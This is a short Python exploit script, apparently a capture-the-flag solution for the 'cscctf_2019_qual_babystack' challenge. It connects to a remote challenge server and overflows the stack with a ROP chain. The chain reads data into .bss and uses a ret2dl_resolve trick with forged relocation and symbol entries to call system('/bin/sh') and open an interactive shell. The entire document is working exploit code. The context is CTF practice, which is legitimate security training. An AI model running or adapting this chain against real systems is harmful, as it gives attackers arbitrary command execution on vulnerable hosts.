from pwn import *
from roputils import *
# r = process('././cscctf_2019_qual_babystack')
r = remote('node3.buuoj.cn',27734)
context.log_level = 'debug'

rop = ROP('././cscctf_2019_qual_babystack')
offset = 0x14
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 40, bss_base)
# gdb.attach(r)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(40, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 40, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()